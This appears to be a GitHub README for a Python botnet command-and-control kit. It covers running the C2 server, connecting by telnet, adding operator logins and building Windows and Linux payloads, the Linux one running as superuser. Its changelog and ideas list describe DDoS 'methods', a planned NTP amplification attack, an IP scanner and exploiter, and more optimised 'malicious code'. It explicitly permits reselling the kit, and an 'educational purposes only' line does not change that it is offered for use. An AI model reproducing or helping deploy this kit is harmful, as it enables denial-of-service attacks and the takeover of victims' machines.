![Login](https://user-images.githubusercontent.com/73953379/193839231-a892fe6b-b5e7-43d5-a934-4d0941a20497.png)

HOWTO 

-- Download PuTTY

-- Open cmd in folder and run 'pip install -r requirements.txt'

-- run.bat Screens the cnc script on port 6667 (Default)

-- connect.bat connects to the cnc using putty

-- Add username:password in logins.txt for many accounts

-- To add methods make a method.py script in "Commands" then add the command in main script "cnc.py"

-- Connect from putty using telnet/raw

-- For Windows the payload is an executable that can be created using autopytoexe.bat

-- For Linux the payload is a bash file that installs python then runs it as superuser

CHANGELOG

9/28/2022/
- Started idea

9/31/2022/
- Made the code work

- Added methods

10/1/2022/
- Added layer 3 method

- Optimized code

- Organised code

10/2/2022/
- Made code even more optimized

- Added "About" and fixed unknown code errors                                                          

IDEAS

-- Add more functions if theres a user named root

-- Add ntp amp attack

-- Add layer 7 methods

-- Optimize malicious code  

-- Add ip scanner and exploiter

-- API support

![C2](https://user-images.githubusercontent.com/73953379/193830831-962cf5b3-5eac-496e-834d-fbe06820d027.png)

-----------------------------------------------------------

You are allowed to resell but you must credit the owner.

-----------------------------------------------------------

!! FOR EDUCATIONAL PURPOSES ONLY !!

-----------------------------------------------------------
